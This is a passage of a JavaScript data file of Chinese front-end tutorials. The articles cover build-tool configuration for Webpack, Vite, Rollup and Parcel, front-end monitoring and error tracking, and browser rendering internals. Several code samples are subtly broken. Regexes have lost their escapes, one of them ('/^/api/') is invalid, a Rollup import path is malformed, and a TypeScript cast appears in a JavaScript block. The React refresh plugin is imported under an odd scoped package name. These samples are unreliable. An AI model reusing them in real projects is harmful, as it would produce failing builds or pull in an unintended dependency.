- 自动化工具集成
- 定期更新依赖
- 工具配置共享

### 学习资源

**规范指南：**
- Airbnb JavaScript 风格指南
- Google JavaScript 风格指南
- 前端代码规范最佳实践
- 团队代码规范制定

**工具文档：**
- ESLint 文档
- Prettier 文档
- Stylelint 文档
- Commitlint 文档

### 案例分析

**大型项目代码规范：**
- Google 的代码规范
- Facebook 的代码规范
- 阿里巴巴的代码规范
- 腾讯的代码规范

**实施效果：**
- 代码质量提升
- 开发效率提高
- 团队协作改善
- 维护成本降低`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"build-optimization",title:"构建工具优化",category:"engineering",difficulty:"medium",tags:["工程化","构建工具","webpack","vite","性能优化"],content:`## 构建工具优化

构建工具是前端工程化的核心，优化构建配置可以显著提升开发效率和构建性能。现代前端项目通常使用Webpack、Vite、Rollup等构建工具，每种工具都有其特点和适用场景。理解这些工具的工作原理和优化策略，对于提升项目构建效率、减少构建时间、优化输出产物至关重要。

### 构建工具对比详解

**Webpack：**
Webpack是最成熟的前端构建工具，功能强大且生态丰富。它通过模块依赖图（Dependency Graph）分析项目结构，将所有模块打包成一个或多个bundle。Webpack支持代码分割、懒加载、Tree Shaking等现代前端特性，适合复杂的企业级应用。但Webpack的构建速度相对较慢，特别是在开发环境下，需要通过缓存、并行构建等优化手段提升性能。

\`\`\`javascript
// Webpack 核心概念
module.exports = {
  // 入口：构建的起点
  entry: './src/index.js',
  
  // 输出：构建的产物
  output: {
    path: path.resolve(__dirname, 'dist'),
    filename: '[name].[contenthash].js',
    clean: true,
  },
  
  // Loader：处理非JavaScript文件
  module: {
    rules: [
      {
        test: /.css$/,
        use: ['style-loader', 'css-loader'],
      },
      {
        test: /.(png|svg|jpg|jpeg|gif)$/i,
        type: 'asset/resource',
      },
    ],
  },
  
  // 插件：扩展Webpack功能
  plugins: [
    new HtmlWebpackPlugin({
      template: './src/index.html',
    }),
    new MiniCssExtractPlugin({
      filename: '[name].[contenthash].css',
    }),
  ],
  
  // 模式：开发或生产
  mode: 'production',
};
\`\`\`

**Vite：**
Vite是新一代前端构建工具，由Vue作者尤雨溪开发。Vite在开发环境下使用原生ES模块，无需打包即可启动开发服务器，实现毫秒级的热更新。生产环境使用Rollup进行构建，输出优化的产物。Vite适合现代前端项目，特别是Vue、React、Svelte等框架项目，开发体验极佳。

\`\`\`javascript
// Vite 配置示例
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import path from 'path';

export default defineConfig({
  // 插件
  plugins: [react()],
  
  // 路径别名
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
  
  // 开发服务器
  server: {
    port: 3000,
    open: true,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
      },
    },
  },
  
  // 构建配置
  build: {
    outDir: 'dist',
    sourcemap: true,
    rollupOptions: {
      output: {
        manualChunks: {
          vendor: ['react', 'react-dom'],
          utils: ['lodash', 'axios'],
        },
      },
    },
  },
});
\`\`\`

**Rollup：**
Rollup专注于JavaScript库的构建，Tree Shaking能力最强，输出体积最小。Rollup使用ES模块作为输入，可以生成多种格式（ESM、CJS、UMD、IIFE）的输出。Rollup配置简单，适合npm包、组件库、工具库等场景。许多知名库（如Vue、React、D3）都使用Rollup构建。

\`\`\`javascript
// Rollup 配置示例
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import terser from '@rollup/plugin-terser';

export default {
  input: 'src/index.js',
  output: [
    {
      file: 'dist/bundle.js',
      format: 'cjs',
      sourcemap: true,
    },
    {
      file: 'dist/bundle.esm.js',
      format: 'esm',
      sourcemap: true,
    },
    {
      file: 'dist/bundle.min.js',
      format: 'iife',
      name: 'MyLibrary',
      plugins: [terser()],
    },
  ],
  plugins: [resolve(), commonjs()],
};
\`\`\`

**Parcel：**
Parcel是零配置的构建工具，开箱即用，自动处理JavaScript、CSS、HTML、图片等资源。Parcel内置了代码分割、热更新、生产优化等功能，适合小型项目和快速原型开发。Parcel的性能优秀，但定制性不如Webpack和Vite。

\`\`\`javascript
// Parcel 零配置使用
// package.json
{
  "scripts": {
    "dev": "parcel src/index.html",
    "build": "parcel build src/index.html"
  }
}

// 可选的 .parcelrc 配置
{
  "extends": "@parcel/config-default",
  "transformers": {
    "*.vue": ["@parcel/transformer-vue"]
  }
}
\`\`\`

### Webpack 优化详解

**性能优化：**
Webpack性能优化是前端工程化的重要环节，主要包括代码分割、缓存、并行构建、缩小搜索范围等策略。合理的优化配置可以将构建时间从几分钟缩短到几十秒，显著提升开发效率。

\`\`\`javascript
// Webpack 性能优化配置
const path = require('path');
const TerserPlugin = require('terser-webpack-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');

module.exports = {
  // 1. 代码分割
  optimization: {
    splitChunks: {
      chunks: 'all',
      minSize: 20000,
      minChunks: 1,
      maxAsyncRequests: 30,
      maxInitialRequests: 30,
      cacheGroups: {
        vendors: {
          test: /[\\/]node_modules[\\/]/,
          priority: -10,
          name: 'vendors',
        },
        default: {
          minChunks: 2,
          priority: -20,
          reuseExistingChunk: true,
        },
      },
    },
    runtimeChunk: 'single',
    minimize: true,
    minimizer: [
      new TerserPlugin({
        parallel: true,
        terserOptions: {
          compress: {
            drop_console: true,
          },
        },
      }),
      new CssMinimizerPlugin(),
    ],
  },
  
  // 2. 缓存配置
  cache: {
    type: 'filesystem',
    buildDependencies: {
      config: [__filename],
    },
  },
  
  // 3. 缩小搜索范围
  resolve: {
    modules: ['node_modules'],
    extensions: ['.js', '.jsx', '.ts', '.tsx', '.json'],
    alias: {
      '@': path.resolve(__dirname, 'src'),
    },
    mainFields: ['browser', 'module', 'main'],
  },
  
  // 4. 并行构建
  module: {
    rules: [
      {
        test: /.js$/,
        exclude: /node_modules/,
        use: [
          {
            loader: 'thread-loader',
            options: {
              workers: require('os').cpus().length - 1,
            },
          },
          {
            loader: 'babel-loader',
            options: {
              cacheDirectory: true,
            },
          },
        ],
      },
    ],
  },
};
\`\`\`

**资源优化：**
资源优化包括图片优化、CSS提取、代码压缩、静态资源处理等。通过合理的资源优化，可以显著减少输出产物的体积，提升页面加载速度。

\`\`\`javascript
// Webpack 资源优化配置
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const ImageMinimizerPlugin = require('image-minimizer-webpack-plugin');
const CopyPlugin = require('copy-webpack-plugin');

module.exports = {
  module: {
    rules: [
      // CSS 提取和优化
      {
        test: /.css$/,
        use: [
          MiniCssExtractPlugin.loader,
          'css-loader',
          'postcss-loader',
        ],
      },
      // 图片优化
      {
        test: /.(png|jpg|jpeg|gif|svg)$/i,
        type: 'asset',
        parser: {
          dataUrlCondition: {
            maxSize: 8 * 1024, // 8kb
          },
        },
        generator: {
          filename: 'images/[hash][ext][query]',
        },
      },
    ],
  },
  
  plugins: [
    // CSS 提取
    new MiniCssExtractPlugin({
      filename: 'css/[name].[contenthash].css',
      chunkFilename: 'css/[id].[contenthash].css',
    }),
    
    // 图片压缩
    new ImageMinimizerPlugin({
      minimizer: {
        implementation: ImageMinimizerPlugin.imageminMinify,
        options: {
          plugins: [
            ['gifsicle', { interlaced: true }],
            ['jpegtran', { progressive: true }],
            ['optipng', { optimizationLevel: 5 }],
            ['svgo', { plugins: [{ name: 'removeViewBox', active: false }] }],
          ],
        },
      },
    }),
    
    // 静态资源复制
    new CopyPlugin({
      patterns: [
        { from: 'public', to: 'public' },
      ],
    }),
  ],
};
\`\`\`

**开发体验优化：**
开发体验优化包括热模块替换、开发服务器、源码映射、错误提示等。良好的开发体验可以提高开发效率，减少调试时间。

\`\`\`javascript
// Webpack 开发配置
const ReactRefreshWebpackPlugin = require('@panda-s/webpack-plugin-react-refresh');

module.exports = {
  mode: 'development',
  devtool: 'eval-cheap-module-source-map',
  
  // 开发服务器
  devServer: {
    static: {
      directory: path.join(__dirname, 'public'),
    },
    compress: true,
    port: 3000,
    hot: true,
    open: true,
    historyApiFallback: true,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
        pathRewrite: { '^/api': '' },
      },
    },
  },
  
  plugins: [
    // 热模块替换
    new ReactRefreshWebpackPlugin(),
  ],
  
  // 源码映射配置
  // eval-cheap-module-source-map: 开发环境推荐
  // source-map: 生产环境推荐（完整映射）
  // hidden-source-map: 生产环境（不暴露源码）
  // nosources-source-map: 生产环境（只显示行号）
};
\`\`\`

### Vite 优化详解

Vite优化主要包括配置优化、性能优化、开发体验等方面。通过合理的配置，可以进一步提升Vite的开发体验和构建性能。

\`\`\`javascript
// Vite 优化配置
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import viteCompression from 'vite-plugin-compression';
import { visualizer } from 'rollup-plugin-visualizer';

export default defineConfig({
  // 1. 别名配置
  resolve: {
    alias: {
      '@': '/src',
      '@components': '/src/components',
      '@utils': '/src/utils',
      '@hooks': '/src/hooks',
    },
  },
  
  // 2. 依赖预构建
  optimizeDeps: {
    include: ['react', 'react-dom', 'lodash', 'axios'],
    exclude: ['tiny-invariant'],
    esbuildOptions: {
      plugins: [],
    },
  },
  
  // 3. 构建配置
  build: {
    // 目标浏览器
    target: 'es2015',
    // 输出目录
    outDir: 'dist',
    // 资源目录
    assetsDir: 'assets',
    // 源码映射
    sourcemap: false,
    // 压缩配置
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true,
        drop_debugger: true,
      },
    },
    // 代码分割
    rollupOptions: {
      output: {
        manualChunks: {
          'vendor-react': ['react', 'react-dom', 'react-router-dom'],
          'vendor-utils': ['lodash', 'axios', 'dayjs'],
          'vendor-ui': ['antd', '@ant-design/icons'],
        },
        // chunk 文件名
        chunkFileNames: 'js/[name]-[hash].js',
        entryFileNames: 'js/[name]-[hash].js',
        assetFileNames: '[ext]/[name]-[hash].[ext]',
      },
    },
    // 块大小限制
    chunkSizeWarningLimit: 500,
    // 压缩
    reportCompressedSize: true,
  },
  
  // 4. 服务器配置
  server: {
    port: 3000,
    open: true,
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^/api/, ''),
      },
    },
    hmr: {
      overlay: true,
    },
  },
  
  // 5. 插件配置
  plugins: [
    react(),
    // gzip 压缩
    viteCompression({
      algorithm: 'gzip',
      ext: '.gz',
    }),
    // 构建可视化
    visualizer(),
  ],
  
  // 6. CSS 配置
  css: {
    preprocessorOptions: {
      less: {
        javascriptEnabled: true,
        modifyVars: {
          'primary-color': '#1890ff',
        },
      },
    },
  },
});
\`\`\`

**Vite 性能优化技巧：**

\`\`\`javascript
// 1. 使用 esbuild 进行代码压缩（比 terser 快 20-40 倍）
build: {
  minify: 'esbuild',
}

// 2. 使用 rollup-plugin-visualizer 分析 bundle
import { visualizer } from 'rollup-plugin-visualizer';

plugins: [
  visualizer({
    filename: 'dist/stats.html',
    open: true,
    gzipSize: true,
    brotliSize: true,
  }),
];

// 3. 使用动态 import 实现路由懒加载
const Home = () => import(/* webpackChunkName: "home" */ './views/Home.vue');
const About = () => import(/* webpackChunkName: "about" */ './views/About.vue');

// 4. 预构建依赖优化
optimizeDeps: {
  // 显式声明需要预构建的依赖
  include: [
    'vue',
    'vue-router',
    'pinia',
    'axios',
  ],
  // 排除不需要预构建的依赖
  exclude: ['tiny-invariant'],
}

// 5. 使用 esbuild-loader 替代 babel-loader（开发环境）
// vite.config.js
export default defineConfig({
  esbuild: {
    jsxFactory: 'h',
    jsxFragment: 'Fragment',
  },
});
\`\`\`

### 构建工具选择建议

**选择 Webpack 的场景：**
- 复杂的企业级应用
- 需要大量自定义配置
- 老项目迁移
- 需要支持旧版浏览器
- 复杂的代码分割需求

\`\`\`javascript
// Webpack 适合复杂项目
module.exports = {
  // 复杂的模块规则
  module: {
    rules: [
      // JavaScript/TypeScript
      {
        test: /.(ts|tsx|js|jsx)$/,
        exclude: /node_modules/,
        use: [
          {
            loader: 'babel-loader',
            options: {
              cacheDirectory: true,
              cacheCompression: false,
            },
          },
        ],
      },
      // Vue
      {
        test: /.vue$/,
        loader: 'vue-loader',
      },
      // CSS
      {
        test: /.css$/,
        use: [
          process.env.NODE_ENV === 'production'
            ? MiniCssExtractPlugin.loader
            : 'style-loader',
          'css-loader',
          'postcss-loader',
        ],
      },
      // 图片
      {
        test: /.(png|jpe?g|gif|svg|webp)$/i,
        type: 'asset',
      },
      // 字体
      {
        test: /.(woff|woff2|eot|ttf|otf)$/i,
        type: 'asset/resource',
      },
    ],
  },
};
\`\`\`

**选择 Vite 的场景：**
- 新项目开发
- Vue 3、React 18+ 项目
- 追求开发体验
- 追求快速启动
- 中小型项目

\`\`\`javascript
// Vite 适合现代项目
// vite.config.ts
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';

export default defineConfig({
  plugins: [vue()],
  server: {
    port: 5173,
    hmr: {
      overlay: true,
    },
  },
  build: {
    target: 'esnext',
    minify: 'esbuild',
  },
});
\`\`\`

**选择 Rollup 的场景：**
- npm 包开发
- 组件库开发
- 工具库开发
- 追求最小输出体积
- 输出多种模块格式

\`\`\`javascript
// Rollup 适合库构建
// rollup.config.js
import resolve from '@rollup/plugin-node-resolve';
import commonjs from '@rollup/plugin-commonjs';
import typescript from '@rollup/plugin-typescript';
import { terser } from 'rollup.plugin.terser';

export default {
  input: 'src/index.ts',
  output: [
    {
      file: 'dist/index.cjs.js',
      format: 'cjs',
      sourcemap: true,
    },
    {
      file: 'dist/index.esm.js',
      format: 'esm',
      sourcemap: true,
    },
    {
      file: 'dist/index.umd.js',
      format: 'umd',
      name: 'MyLibrary',
      sourcemap: true,
    },
  ],
  plugins: [
    resolve(),
    commonjs(),
    typescript({
      tsconfig: './tsconfig.json',
    }),
    terser(),
  ],
};
\`\`\`

**选择 Parcel 的场景：**
- 快速原型开发
- 小型项目
- 零配置需求
- 简单静态网站
- 学习或演示项目

\`\`\`javascript
// Parcel 零配置示例
// index.html
<!DOCTYPE html>
<html>
<head>
  <link rel="stylesheet" href="./styles.css">
</head>
<body>
  <div id="app"></div>
  <script type="module" src="./index.js"></script>
</body>
</html>

// 自动处理 JavaScript、CSS、图片等资源
// 无需任何配置文件
\`\`\`

### 最佳实践总结

选择构建工具时，需要根据项目的具体需求和团队的技术栈进行权衡。Webpack适合复杂的企业级应用，Vite适合现代前端项目，Rollup适合库开发，Parcel适合小型项目。无论选择哪种工具，都应该关注构建性能优化、代码分割、缓存策略等方面，以提升开发体验和用户体验。

### 构建性能优化

**通用策略：**
- 减少依赖体积
- 按需加载
- 缓存构建结果
- 并行构建
- 优化构建配置

**依赖管理：**
- 分析依赖体积：webpack-bundle-analyzer
- 移除未使用的依赖
- 合理使用 polyfill
- 按需引入库

**构建缓存：**
- 缓存依赖：node_modules/.cache
- 缓存构建结果：webpack 缓存
- 缓存 CI/CD 构建：actions/cache
- 合理的缓存策略

**监控与分析：**
- 构建时间监控
- 构建产物分析
- 性能瓶颈识别
- 持续优化

### 最佳实践

**开发环境：**
- 使用 Vite 或 webpack-dev-server
- 启用热模块替换
- 优化开发服务器配置
- 合理的源码映射

**生产环境：**
- 代码分割
- 资源压缩
- 缓存策略
- 按需加载

**CI/CD 环境：**
- 缓存依赖
- 并行构建
- 构建产物分析
- 性能监控

### 工具与资源

**分析工具：**
- webpack-bundle-analyzer
- rollup-plugin-visualizer
- source-map-explorer
- bundlephobia

**配置工具：**
- create-vite
- vue-cli
- create-react-app
- custom webpack config

**学习资源：**
- Webpack 文档
- Vite 文档
- Rollup 文档
- 前端构建优化指南

### 案例分析

**大型项目构建优化：**
- Facebook 的构建优化
- Google 的构建优化
- 阿里巴巴的构建优化
- 腾讯的构建优化

**实施效果：**
- 开发服务器启动时间减少
- 构建时间缩短
- 构建产物体积减小
- 部署速度提升`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"frontend-monitoring",title:"前端监控与错误追踪",category:"engineering",difficulty:"medium",tags:["工程化","前端监控","错误追踪","性能监控"],content:`## 前端监控与错误追踪

前端监控是保障应用质量的重要手段，通过实时监控和错误追踪，及时发现和解决问题。

### 监控类型

**性能监控：**
- 页面加载性能
- 核心 Web Vitals
- 资源加载时间
- 用户交互响应时间

**错误监控：**
- JavaScript 错误
- 资源加载错误
- API 错误
- 网络错误

**用户行为监控：**
- 页面浏览
- 点击事件
- 表单提交
- 会话录制

**业务监控：**
- 转化率
- 漏斗分析
- 业务指标
- 用户留存

### 监控工具

**Sentry：**
- 错误追踪
- 性能监控
- 会话录制
- 支持多种平台

**New Relic：**
- 应用性能监控
- 浏览器监控
- 服务器监控
- 全栈监控

**Datadog：**
- 实时监控
- 日志管理
- APM
- 安全监控

**Google Analytics 4：**
- 用户行为分析
- 转化追踪
- 受众分析
- 集成 Google 生态

**Clarity：**
- 会话录制
- 热图分析
- 用户行为分析
- 免费工具

### 错误追踪

**错误捕获：**
- try-catch
- window.onerror
- window.addEventListener('error')
- window.addEventListener('unhandledrejection')

**错误分类：**
- 语法错误
- 运行时错误
- 网络错误
- 资源错误

**错误处理：**
- 全局错误处理
- 组件错误边界
- 异步错误处理
- 错误上报

**错误分析：**
- 错误频率
- 错误分布
- 错误堆栈
- 用户环境

### 性能监控

**核心指标：**
- LCP (Largest Contentful Paint)
- FID (First Input Delay)
- CLS (Cumulative Layout Shift)
- TTFB (Time to First Byte)

**监控方法：**
- Web Vitals API
- Performance API
- Navigation Timing API
- Resource Timing API

**性能分析：**
- 首次加载性能
- 路由切换性能
- 交互性能
- 资源加载性能

### 用户行为监控

**事件追踪：**
- 页面浏览事件
- 点击事件
- 表单提交事件
- 自定义事件

**会话分析：**
- 会话时长
- 页面路径
- 停留时间
- 设备信息

**热图分析：**
- 点击热图
- 滚动热图
- 注意力热图
- 转化热图

### 集成与实施

**前端集成：**
- 初始化监控 SDK
- 配置采样率
- 自定义事件
- 错误边界

**后端集成：**
- 服务器端监控
- API 监控
- 数据库监控
- 全栈监控

**告警配置：**
- 错误率告警
- 性能指标告警
- 业务指标告警
- 自定义告警

### 最佳实践

**监控策略：**
- 全面监控：前端、后端、基础设施
- 实时告警：及时发现问题
- 数据可视化：便于分析
- 持续优化：基于监控数据

**错误处理：**
- 全局错误捕获
- 错误分类和优先级
- 错误复现和调试
- 错误修复和验证

**性能优化：**
- 基于监控数据优化
- 持续性能测试
- A/B 测试
- 性能预算

**用户体验：**
- 监控用户行为
- 分析用户反馈
- 优化用户流程
- 提升用户满意度

### 工具配置

**Sentry 配置：**

import * as Sentry from '@sentry/react';
import { BrowserTracing } from '@sentry/tracing';

Sentry.init({
  dsn: 'YOUR_DSN',
  integrations: [new BrowserTracing()],
  tracesSampleRate: 1.0,
  beforeSend(event) {
    // 自定义错误处理
    return event;
  }
});

**Google Analytics 配置：**

import { initializeApp } from 'firebase/app';
import { getAnalytics } from 'firebase/analytics';

const app = initializeApp({
  apiKey: 'YOUR_API_KEY',
  authDomain: 'YOUR_AUTH_DOMAIN',
  projectId: 'YOUR_PROJECT_ID',
  appId: 'YOUR_APP_ID',
  measurementId: 'YOUR_MEASUREMENT_ID'
});

const analytics = getAnalytics(app);

### 案例分析

**大型网站监控：**
- Google 的监控实践
- Facebook 的监控实践
- Amazon 的监控实践
- 阿里巴巴的监控实践

**实施效果：**
- 错误率降低
- 性能提升
- 用户体验改善
- 业务指标优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"browser-architecture",title:"浏览器架构与渲染流程",category:"browser",difficulty:"medium",tags:["浏览器原理","浏览器架构","渲染流程","进程模型"],content:`## 浏览器架构与渲染流程

现代浏览器采用多进程架构，了解其工作原理对于前端开发至关重要。

### 🏗️ 浏览器进程模型

**进程与线程：**
- **进程**：操作系统分配资源的基本单位，拥有独立的内存空间和系统资源，进程之间相互隔离，一个进程崩溃不会影响其他进程
- **线程**：进程内的执行单元，共享进程的内存和资源，线程切换开销小，但需要处理同步和互斥问题
- **多进程优势**：提高浏览器稳定性，单个标签页崩溃不影响其他页面；增强安全性，进程隔离防止恶意代码扩散；优化性能，充分利用多核CPU资源

**主要进程：**
- **浏览器进程**：负责浏览器整体控制，包括地址栏、书签栏、前进后退按钮等UI界面管理，以及网络请求管理、文件访问等核心功能
- **渲染进程**：负责页面渲染工作，将HTML、CSS和JavaScript转换为用户可见的网页，每个标签页通常对应一个独立的渲染进程
- **插件进程**：负责运行浏览器插件，如Flash、PDF查看器等，插件进程与渲染进程隔离，防止插件崩溃影响页面
- **GPU 进程**：负责处理图形渲染任务，将页面内容绘制到屏幕上，支持硬件加速，提高渲染性能和流畅度

**渲染进程线程：**
- **GUI 线程**：负责渲染页面内容，解析HTML、CSS，构建DOM树和渲染树，执行布局和绘制操作，与JS引擎线程互斥
- **JS 引擎线程**：负责解析和执行JavaScript代码，处理用户脚本逻辑，执行事件处理函数，GUI线程和JS引擎线程不能同时工作
- **事件触发线程**：负责管理事件队列，当事件被触发时将回调函数添加到任务队列，等待JS引擎线程执行，实现异步事件处理
- **定时器线程**：负责管理setTimeout和setInterval定时器，当定时器到期时将回调函数添加到任务队列，实现延迟执行功能
- **网络请求线程**：负责处理网络请求，当请求完成时将回调函数添加到任务队列，实现异步网络请求，不阻塞主线程

### 💻 代码示例：查看浏览器进程

\`\`\`javascript
// 在 Chrome DevTools 中查看进程信息
// 1. 打开 Chrome DevTools
// 2. 进入 Performance 面板
// 3. 录制页面操作
// 4. 查看 Bottom-Up 视图中的进程信息

// 检查当前页面的进程ID
console.log('当前页面进程信息:', performance.memory);
console.log('时间戳:', performance.now());

// 监控页面性能
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('性能条目:', entry.name, entry.duration);
  }
});
observer.observe({ entryTypes: ['measure', 'navigation'] });
\`\`\`

### 🔄 渲染流程

**HTML 解析：**
- **解析 HTML 生成 DOM 树**：浏览器将HTML文档解析为DOM（文档对象模型）树，DOM树是HTML文档的结构化表示，包含所有HTML元素及其层级关系
- **词法分析**：将 HTML 分解为标记：浏览器将HTML字符串分解为一个个标记（Token），如开始标签、结束标签、属性名、属性值等，为后续语法分析做准备
- **语法分析**：构建 DOM 树：根据标记序列构建DOM树，处理元素之间的父子关系、兄弟关系，构建完整的文档结构树
- **DOM 树**：表示页面结构：DOM树是HTML文档在内存中的表示，JavaScript可以通过DOM API操作DOM树，从而动态修改页面内容和结构

**CSS 解析：**
- **解析 CSS 生成 CSSOM 树**：浏览器将CSS样式表解析为CSSOM（CSS对象模型）树，CSSOM树包含所有CSS规则及其层级关系，用于计算元素最终样式
- **处理 CSS 选择器**：浏览器解析CSS选择器，确定样式规则应用于哪些元素，处理选择器的优先级和层叠规则，计算元素的计算样式
- **计算样式**：浏览器根据CSSOM树和DOM树，计算每个元素的最终样式值，包括继承样式、默认样式和显式设置的样式
- **CSSOM 树**：表示样式信息：CSSOM树是CSS样式表在内存中的表示，JavaScript可以通过CSSOM API操作样式规则，动态修改页面样式

**渲染树构建：**
- **结合 DOM 树和 CSSOM 树**：浏览器将DOM树和CSSOM树合并，生成渲染树（Render Tree），渲染树只包含需要显示的节点和这些节点的样式信息
- **生成渲染树**：渲染树是DOM树和CSSOM树的结合产物，每个节点都包含内容和计算后的样式，是后续布局和绘制的基础
- **只包含可见元素**：渲染树不包含display:none的元素、head元素、script元素等不可见元素，只包含实际需要渲染到屏幕上的元素
- **计算每个元素的样式**：浏览器根据CSSOM树计算渲染树中每个节点的最终样式值，包括继承样式、默认样式和显式设置的样式

**布局 (Layout)：**
- **计算元素的位置和大小**：浏览器根据渲染树计算每个元素在页面中的精确位置和尺寸，包括元素的坐标、宽高、边距、边框等几何信息
- **确定元素在页面中的布局**：浏览器处理元素的定位方式（static、relative、absolute、fixed、sticky），确定元素在页面中的最终位置
- **生成布局树**：布局树包含所有可见元素的几何信息，是后续绘制阶段的基础，布局树的构建过程也称为回流（Reflow）
- **也称为回流 (Reflow)**：当页面布局发生变化时，浏览器需要重新计算元素的位置和大小，这个过程称为回流，回流是性能消耗较大的操作

**绘制 (Paint)：**
- **将渲染树转换为像素**：浏览器根据布局树中的几何信息，将每个元素绘制到屏幕上，将矢量图形转换为像素点阵，生成最终的视觉效果
- **绘制元素的视觉效果**：浏览器绘制元素的背景色、边框、文字、阴影等视觉属性，处理渐变、图片、文字渲染等复杂视觉效果
- **生成图层**：浏览器将页面内容分层，每个图层独立绘制，便于后续合成操作，提高渲染性能，支持硬件加速
- **也称为重绘 (Repaint)**：当元素的视觉样式发生变化但不影响布局时，浏览器需要重新绘制元素，这个过程称为重绘，重绘的性能消耗小于回流

**合成 (Compositing)：**
- **将图层合成为最终图像**：浏览器将多个图层按照正确的顺序和位置合成到一起，生成最终显示在屏幕上的完整图像，这个过程在GPU中进行
- **利用 GPU 加速**：合成操作在GPU中进行，利用显卡的并行计算能力，大幅提高渲染性能，减少CPU负担，实现流畅的动画效果
- **提高渲染性能**：通过图层合成，浏览器可以只更新变化的图层，而不需要重新绘制整个页面，显著提高渲染性能和响应速度
- **减少重绘和回流**：合成操作独立于主线程，不会触发回流和重绘，适合处理动画、3D变换等高频更新操作，提供更流畅的用户体验

### 💻 代码示例：监控渲染性能

\`\`\`javascript
// 监控关键渲染路径
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.entryType === 'navigation') {
      const navEntry = entry as PerformanceNavigationTiming;
      console.log('DOM 解析时间:', navEntry.domContentLoadedEventEnd - navEntry.domContentLoadedEventStart);
      console.log('页面加载时间:', navEntry.loadEventEnd - navEntry.loadEventStart);
      console.log('首次绘制:', navEntry.responseStart - navEntry.requestStart);
    }
  }
});

observer.observe({ entryTypes: ['navigation'] });

// 强制同步布局示例
function badExample() {
  const element = document.getElementById('myElement');
  // 触发回流
  console.log(element.offsetWidth);
  // 修改样式
  element.style.width = '100px';
  // 再次触发回流
  console.log(element.offsetHeight);
}

// 优化后的示例
function goodExample() {
  const element = document.getElementById('myElement');
  // 缓存布局信息
  const width = element.offsetWidth;
  const height = element.offsetHeight;
  
  // 批量修改样式
  element.style.cssText = 'width: 100px; height: 50px; background: blue;';
  
  console.log('原始尺寸:', width, height);
}
\`\`\`

### ⚡ 关键渲染路径

**关键渲染路径：**
- **HTML 解析 → CSS 解析 → 渲染树构建 → 布局 → 绘制**：这是浏览器将HTML、CSS和JavaScript转换为屏幕上像素的完整过程，每个步骤都需要时间，优化这个路径可以提高首屏加载速度
- **优化关键渲染路径可以提高首屏加载速度**：通过减少关键资源数量、优化资源大小、延迟加载非关键资源等方式，可以显著提高页面的首次渲染速度，改善用户体验
- **关键资源**：影响首屏渲染的资源：关键资源包括阻塞渲染的CSS、阻塞解析的JavaScript、首屏可见的图片等，这些资源的加载和解析直接影响首屏渲染时间

**优化策略：**
- **减少关键资源数量**：通过内联关键CSS、延迟加载非关键JavaScript、合并CSS和JavaScript文件等方式，减少阻塞渲染的资源数量，加快首屏渲染速度
- **优化关键资源大小**：通过压缩CSS和JavaScript文件、优化图片大小、移除未使用的代码等方式，减少关键资源的体积，缩短下载和解析时间
- **缩短关键资源加载时间**：使用CDN加速资源加载、启用HTTP/2多路复用、使用preload预加载关键资源、优化服务器响应时间等方式，加快资源加载速度
- **优化渲染阻塞**：将非关键CSS设置为媒体查询、使用async或defer属性加载JavaScript、将JavaScript放在body底部等方式，减少渲染阻塞

### 🚀 浏览器渲染优化

**减少回流：**
- **使用 CSS transform 代替 top/left**：transform属性不会触发回流，只触发合成，性能更好，适合处理动画和位移效果，推荐使用translate3d触发GPU加速
- **批量修改样式**：通过修改元素的class或使用cssText一次性修改多个样式属性，避免多次触发回流，减少性能消耗
- **使用 documentFragment**：在内存中构建DOM片段，一次性插入到文档中，避免多次操作DOM导致的多次回流，提高性能
- **避免频繁访问布局属性**：读取offsetTop、offsetLeft、offsetWidth、offsetHeight等属性会强制浏览器同步计算布局，应缓存这些值避免重复读取

### 💻 代码示例：关键渲染路径优化

\`\`\`html
<!-- 优化前：阻塞渲染的资源 -->
<link rel="stylesheet" href="styles.css">
<script src="main.js"></script>

<!-- 优化后：内联关键CSS，异步加载JS -->
<style>
  /* 关键CSS内联 */
  body { margin: 0; font-family: Arial; }
  .header { background: #333; color: white; padding: 1rem; }
</style>

<!-- 预加载关键资源 -->
<link rel="preload" href="fonts/main.woff2" as="font" crossorigin>
<link rel="preload" href="images/hero.webp" as="image">

<!-- 非关键CSS延迟加载 -->
<link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="styles.css"></noscript>

<!-- 异步加载JavaScript -->
<script src="main.js" async></script>
\`\`\`

\`\`\`javascript
// 批量DOM操作优化
function optimizedDOMUpdate() {
  // 创建文档片段
  const fragment = document.createDocumentFragment();
  
  // 在内存中构建DOM
  for (let i = 0; i < 1000; i++) {
    const div = document.createElement('div');
    div.className = 'item';
    div.textContent = \`Item \${i}\`;
    fragment.appendChild(div);
  }
  
  // 一次性插入到文档
  document.getElementById('container').appendChild(fragment);
}

// 使用 requestAnimationFrame 优化动画
function smoothAnimation(element) {
  let start = null;
  
  function animate(timestamp) {
    if (!start) start = timestamp;
    const progress = timestamp - start;
    
    // 使用 transform 而不是 top/left
    element.style.transform = \`translateX(\${Math.min(progress / 10, 200)}px)\`;
    
    if (progress < 2000) {
      requestAnimationFrame(animate);
    }
  }
  
  requestAnimationFrame(animate);
}
\`\`\`

**减少重绘：**
- **避免使用 CSS expressions**：CSS表达式会在页面滚动、缩放等操作时频繁重新计算，导致大量重绘，严重影响性能，应使用JavaScript或纯CSS替代
- **合理使用 visibility 代替 display**：visibility:hidden只触发重绘不触发回流，而display:none会触发回流，对于需要频繁切换显示隐藏的元素，使用visibility性能更好
